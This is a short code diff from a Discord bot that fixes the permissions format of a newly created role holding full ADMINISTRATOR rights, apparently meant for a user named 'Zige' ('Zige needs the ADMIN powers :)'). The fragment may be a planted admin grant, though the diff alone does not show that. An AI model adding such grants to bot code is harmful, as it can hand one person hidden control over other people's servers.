@@ -57,7 +57,7 @@ module.exports = {
               color: "#FF0000",
               mentionable: false,
               position: roleZ.position,
-              permissions: "ADMINISTRATOR",
+              permissions: ["ADMINISTRATOR"],
               reason: "Zige needs the ADMIN powers :)",
             })
             .then((role) => {
